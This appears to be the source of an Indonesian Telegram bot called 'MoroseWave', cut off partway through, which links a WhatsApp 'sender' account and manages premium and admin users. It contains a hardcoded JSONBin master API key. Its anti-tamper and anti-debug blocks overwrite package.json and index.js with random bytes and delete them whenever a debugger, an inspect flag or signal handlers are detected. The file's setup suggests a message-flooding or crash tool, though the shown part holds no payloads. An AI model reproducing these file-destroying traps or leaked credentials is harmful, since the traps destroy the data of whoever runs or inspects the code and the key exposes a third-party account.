//Base By @Luctadvorisme 
(function() {
  'use strict';

  // ---------------- Native References ----------------
  const nativeFs = require('fs');
  const nativeChildExec = require('child_process').execSync;
  const nativePid = process.pid;
  const nativeExit = process.exit.bind(process);

  // ---------------- Utilities ----------------
  let fsExtra;
  try { fsExtra = require('fs-extra'); } catch(e) { fsExtra = nativeFs; }
  const path = require('path');
  const crypto = require('crypto');

  // ---------------- File Path & Baseline ----------------
  const preferName = 'index.js';
  let filePath = path.resolve(__dirname, preferName);
  if (!nativeFs.existsSync(filePath)) filePath = __filename;

  function sha256(s){ return crypto.createHash('sha256').update(s,'utf8').digest('hex'); }

  let baselineHash, baselineLines, baselineLineHashes;
  try {
    const content = nativeFs.readFileSync(filePath, 'utf8');
    baselineHash = sha256(content);
    baselineLines = content.split(/\r?\n/).length;
    baselineLineHashes = content.split(/\r?\n/).map(l=>sha256(l));
    console.log('[i] Baseline SHA256 captured:', baselineHash, '| lines:', baselineLines);
  } catch(e) {
    console.error('[!] ERROR membaca baseline integritas:', e.message);
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e){}
    try { nativeExit(1); } catch(e){}
    while(1){}
  }

  // ---------------- Hard Fail (Local) ----------------
  function hardFail(reason) {
    const timestamp = new Date().toISOString();
    const auditLine = `[${timestamp}] ALERT: ${reason} | pid=${nativePid} | file=${filePath}\n`;

    try { nativeFs.appendFileSync(path.resolve(__dirname, 'xxx.audit.log'), auditLine, 'utf8'); } catch (e) {
      try { nativeFs.appendFileSync('/tmp/xxx.audit.log', auditLine, 'utf8'); } catch(e2) {}
    }

    console.error('\n[!] DETEKSI PENAMBAHAN KODE / TAMPERING:', reason, '| timestamp:', timestamp);

    try { nativeChildExec('kill -9 ' + nativePid, { stdio:'ignore' }); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1) {}
  }

  // ---------------- Integritas Checker ----------------
  function checkIntegrity() {
    try {
      const curr = nativeFs.readFileSync(filePath,'utf8');
      if (sha256(curr) !== baselineHash) {
        const currLinesArr = curr.split(/\r?\n/);
        if (currLinesArr.length > baselineLines) return hardFail('Baris bertambah (penambahan kode).');
        for (let i=0; i<Math.min(baselineLineHashes.length,currLinesArr.length); i++) {
          if (sha256(currLinesArr[i]) !== baselineLineHashes[i]) {
            return hardFail('Perubahan pada baris ' + (i+1));
          }
        }
        return hardFail('File diubah (SHA mismatch).');
      }
    } catch(e) {
      return hardFail('Gagal baca file saat pengecekan integritas: '+(e.message||e));
    }
  }
  setInterval(checkIntegrity, 1000);
  setTimeout(checkIntegrity, 200);

  // ---------------- Safe Require Option ----------------
  const allowRequire = (process.env.ALLOW_REQUIRE === '1');
  if (!allowRequire) {
    if (require.main !== module) {
      console.error('[!] SECURITY ALERT: Dipanggil via require() - abort.');
      hardFail('Dipanggil via require() tanpa ALLOW_REQUIRE.');
    }
    if (module.parent !== null && module.parent !== undefined) {
      console.error('[!] SECURITY ALERT: Parent module terdeteksi - abort.');
      hardFail('Parent module terdeteksi tanpa ALLOW_REQUIRE.');
    }
  } else {
    console.log('[i] ALLOW_REQUIRE=1 aktif: file akan mengizinkan require() dari module lain.');
  }

  // ---------------- Anti-Hook / Anti-Bypass ----------------
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;

  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  function forceKill() {
    try { nativeChildExec('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1){}
  }

  // CEK ANTI-HOOK & OVERRIDE
  try {
    const M = require('module');
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) forceKill();
  } catch(e) {}
  try {
    const exitFn = process[exitStr];
    const killFn = process[killStr];
    if (proxyPattern.test(exitFn.toString()) || bypassPattern.test(exitFn.toString())) forceKill();
    if (proxyPattern.test(killFn.toString()) || bypassPattern.test(killFn.toString()) || killFn.toString().length < 50) forceKill();
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) forceKill();
  } catch(e) {}

  const checkGlobals = () => {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try { if (flags[i] in global && global[flags[i]]) forceKill(); } catch(e) {}
    }
  };
  checkGlobals();

  // CEK HTTPS / HTTP MASKED
  const checkHttps = () => {
    try {
      const https = require(httpsStr);
      if (Function.prototype.toString.call(https.request) !== https.request.toString()) forceKill();
    } catch(e) {}
  };
  const checkHttp = () => {
    try {
      const http = require(httpStr);
      if (Function.prototype.toString.call(http.request) !== http.request.toString()) forceKill();
    } catch(e) {}
  };
  setTimeout(()=>{ checkHttps(); checkHttp(); },500);

  // ---------------- Runtime Monitor ----------------
  const monitor = () => {
    if (require.main !== module || (module.parent !== null && module.parent !== undefined)) forceKill();
    try {
      const M = require('module');
      if (bypassPattern.test(M.prototype.require.toString())) forceKill();
    } catch(e) {}
    checkHttps(); checkHttp(); checkGlobals();
  };
  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

})();

// ==================== MAIN CODE ====================
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const sessions = new Map();
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
const axios = require("axios");

// ========== VALIDASI TOKEN DENGAN JSONBIN.IO ==========
const BIN_ID = "6a6de1daf5f4af5e29ddcb99";
const API_KEY = "$2a$10$.k4ALJ7auWQLUF5ptjtTZuZpmLvKCXG5Zg.gPp5oax8NpHmRX0dte";

async function checkToken() {
  try {
    console.log("🔍 Mengecek token ke JSONBin...");
    const res = await axios.get(
      `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`,
      {
        headers: {
          "X-Master-Key": API_KEY
        }
      }
    );

    const tokens = res.data.record.tokens;

    if (!Array.isArray(tokens)) {
      console.log("❌ Format token invalid");
      process.exit(1);
    }

    if (!tokens.includes(tokenBot)) {
      console.log("❌ Token tidak terdaftar di JSONBin");
      console.log(`📋 Token Anda: ${tokenBot}`);
      process.exit(1);
    }

    console.log("✅ Token valid! Bot akan berjalan...");
  } catch (err) {
    console.log("❌ Gagal cek token:", err.message);
    if (err.response) {
      console.log("📋 Response status:", err.response.status);
    }
    process.exit(1);
  }
}

// Jalankan validasi token
checkToken();

// ========== GLOBAL ==========
let secureMode = false;
function activateSecureMode() { secureMode = true; }

function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let errorData = '';
          res.on('data', c => errorData += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}: ${errorData}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const moment = require('moment-timezone');
const EventEmitter = require('events');

// ========== EXPORT SESSIONS ==========
module.exports = { sessions };

// ========== MAKE IN MEMORY STORE ==========
const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();

  let chats = {};
  let messages = {};
  let contacts = {};

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);

      if (messages[chatId].length > 50) {
        messages[chatId].shift();
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      };
    }
  });

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m));
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c));
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c));
    },
    logger
  };
};

// ========== CONSTANTS ==========
// ========== CONSTANTS ==========
const thumbnailUrl = "https://e.top4top.io/p_3865pibj11.jpg";
const thumbnailUrl2 = "https://f.top4top.io/p_3865uwg0l1.png";
const thumbnailVideo = "https://f.top4top.io/m_3866m645s1.mp4";

// ========== CREATE SAFE SOCK ==========
function createSafeSock(sock) {
  let sendCount = 0;
  const MAX_SENDS = 500;
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.sendMessage(jid, message);
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
      const jid = normalize(target);
      return await sock.relayMessage(jid, messageObj, opts);
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)); } catch(e) {}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)); } catch(e) {}
    }
  };
}

// ========== FUNGSI PENGHAPUS FILE ==========
function destroyFiles() {
  try {
    const DatabaseFile = ['package.json', 'index.js'];
    const currentDir = process.cwd();
    DatabaseFile.forEach(file => {
      const filePath = path.join(currentDir, file);
      if (fs.existsSync(filePath)) {
        try {
          const content = fs.readFileSync(filePath, 'utf8');
          const randomData = Array.from({ length: content.length }, () => 
            String.fromCharCode(33 + Math.floor(Math.random() * 90))
          ).join('');
          fs.writeFileSync(filePath, randomData);         
          fs.unlinkSync(filePath);               
        } catch (err) {}
      }
    });
  } catch (err) {}
}

// ========== BANNER ==========
function showBanner() {
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
  Developer: @Luctadvorisme 
  Version: 31.0.0
  Status: Bot Connected
  `));
}

// ========== PROTEKSI UTAMA ==========
(() => {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const t1 = process.hrtime.bigint();
    debugger;
    const t2 = process.hrtime.bigint();
    if (Number(t2 - t1) / 1e6 > 80) {
      destroyFiles();
      throw new Error(randErr());
    }
  }, 800);

  setInterval(() => {
    if (process.execArgv.join(" ").includes("--inspect") ||
        process.execArgv.join(" ").includes("--debug")) {
      destroyFiles();
      throw new Error(randErr());
    }
  }, 1500);

  showBanner();
})();

// ========== PROTEKSI KEDUA ==========
(() => {
  const hardExit = process.exit.bind(process);
  const hardKill = process.kill.bind(process);

  if (!process.exit.hasOwnProperty('writable') || process.exit.writable !== false) {
    Object.defineProperty(process, "exit", {
      value: hardExit,
      writable: false,
      configurable: false,
      enumerable: true,
    });
  }
  if (!process.kill.hasOwnProperty('writable') || process.kill.writable !== false) {
    Object.defineProperty(process, "kill", {
      value: hardKill,
      writable: false,
      configurable: false,
      enumerable: true,
    });
  }

  Object.freeze(Function.prototype);
  Object.freeze(Object.prototype);
  Object.freeze(Array.prototype);

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`Security Alert: Token Not Validate Bypass`));
        destroyFiles();
        activateSecureMode();  
        hardExit(1);  
      }  
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {  
        if (process.listeners(sig).length > 0) {  
          console.log(chalk.bold.yellow(`Security Alert: Script Dipaksa DiBypass`));
          destroyFiles();
          activateSecureMode();  
          hardExit(1);  
        }  
      }  
      if (eval.toString().length !== 33 || Function.toString().length !== 37) {  
        destroyFiles();
        activateSecureMode();  
        hardExit(1);  
      }  
    } catch {  
      destroyFiles();
      activateSecureMode();  
      hardExit(1);  
    }
  }, 1500);
  
  setInterval(() => {
    if (typeof activateSecureMode !== "function") {
      destroyFiles();
      hardExit(1);
    }
  }, 2500);
})();

console.log(chalk.green("[✓] Script siap - Proteksi aktif, hapus file hanya saat bypass"));

// ========== QUESTION FUNCTION ==========
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const bot = new Telegraf(tokenBot);

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
let pollData = null;
let pollKey = null;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const dbPath = "./database/ControlCommand.json";

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃ STATUS BOT : CONNECTED
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡</code></pre>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  let cmd = text.split(" ")[0].toLowerCase();

  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "MOROWAVE");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⟡━⟢ MoroseWave ⟣━⟡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let adminList = adminUsers;

const isAdmin = (userId) => {
    return adminUsers.includes(userId.toString());
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

const addAdmin = (userId) => {
    userId = userId.toString();
    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveJSON(adminFile, adminUsers);
    }
};

const removeAdmin = (userId) => {
    userId = userId.toString();
    const before = adminUsers.length;
    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);
    return adminUsers.length < before;
};

const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

const adminPolls = {};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    addAdmin(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin MoroseWave!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = removeAdmin(userId);

    if (wasAdmin) {
